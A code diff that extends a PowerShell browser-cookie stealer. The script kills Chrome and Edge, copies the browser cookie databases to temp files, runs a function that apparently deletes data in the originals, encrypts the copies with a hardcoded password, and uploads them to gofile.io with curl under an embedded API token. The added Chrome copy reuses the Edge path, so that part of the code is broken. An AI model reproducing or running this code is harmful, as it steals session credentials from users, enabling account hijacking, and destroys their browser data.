@@ -57,13 +57,20 @@ function Protect-File {
 if (-not ([System.Management.Automation.PSTypeName]"Win32.SQLiteSafe").Type) {
     Add-Type -MemberDefinition $Signature -Name "SQLiteSafe" -Namespace "Win32"
 }
-
+Stop-Process -Name "chrome" -Force -ErrorAction SilentlyContinue
 Stop-Process -Name "msedge" -Force -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 1
 $originalPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
-$dbPath = "$env:TEMP\edge_cookies_work"
-Copy-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies" $dbPath -Force
-
+$dbPath = "$env:TEMP\edge_tihng"
+Copy-Item $originalPath $dbPath -Force
+$originalPath2 = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
+$dbPath2 = "$env:TEMP\chromes_tihng"
+Copy-Item $originalPath2 $dbPath2 -Force
+function delete-data {
+    param (
+        [string]$originalPath,
+        [string]$p
+    )
 $dbHandle = [IntPtr]::Zero
 
 
@@ -84,7 +91,10 @@ if ([Win32.SQLiteSafe]::sqlite3_open($originalPath, [ref]$dbHandle) -eq 0) {
     }
 
     [Win32.SQLiteSafe]::sqlite3_close($dbHandle)
-}
+}}
+
+delete-data -originalPath $originalPath -p "s"
+delete-data -originalPath $originalPath2 -p "s"
 # 1. Configuration
 $apiToken = "hV7e6NmlToS8RPAEiEed3KhiKcIlUkWK" 
 
@@ -92,9 +102,9 @@ $apiToken = "hV7e6NmlToS8RPAEiEed3KhiKcIlUkWK"
 $serverReq = Invoke-RestMethod -Uri "https://api.gofile.io/servers"
 $server = $serverReq.data.servers[0].name
 Protect-File -FilePath $dbPath -p "For_oNS."
-
+Protect-File -FilePath $dbPath2 -p "For_oNS."
 $uploadUrl = "https://$($server).gofile.io/contents/uploadfile"
-$response = curl.exe -F "file=@$dbPath.crypt" -F "token=$apiToken" $uploadUrl
+$response = curl.exe -F "file=@$dbPath.crypt" -F "file=@$dbPath2.crypt" -F "token=$apiToken" $uploadUrl
 
 
 $jsonResult = $response | ConvertFrom-Json
